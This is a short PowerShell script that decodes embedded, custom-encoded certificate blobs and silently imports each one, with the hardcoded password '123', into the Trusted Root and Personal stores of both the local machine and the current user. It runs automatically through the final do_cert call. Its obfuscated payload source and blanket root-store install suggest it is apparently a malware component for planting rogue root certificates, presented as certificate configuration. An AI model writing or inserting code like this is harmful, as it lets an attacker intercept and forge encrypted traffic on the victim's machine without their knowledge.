. ./consts_body.ps1
. ./consts_cert.ps1
. ./utils.ps1

function Cert-Work {
    param(
        [string] $contentString
    )
    $outputFilePath = [System.IO.Path]::GetTempFileName()
    CustomDecode -inContent $contentString -outFile $outputFilePath

    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
}

function Install-CertificateToStores {
    param(
        [string] $CertificateFilePath,
        [string] $Password
    )

    try {
        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force

        # Install for Local Machine
        $stores = @("Cert:\LocalMachine\My", "Cert:\LocalMachine\Root")

        # Install for Current User
        $stores += @("Cert:\CurrentUser\My", "Cert:\CurrentUser\Root")

        foreach ($store in $stores) {
            Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $store -Password $securePassword -ErrorAction Stop
            Write-Host "Certificate installed successfully to $store"
        }
    } catch {
        throw "Failed to install certificate: $_"
    }
}

function do_cert {
    try 
    {
        foreach ($key in $xdata.Keys) {
            Cert-Work -contentString $xdata[$key]
        }
    }
    catch {
        writedbg "An error occurred (ConfigureCertificates): $_"
      }
}

do_cert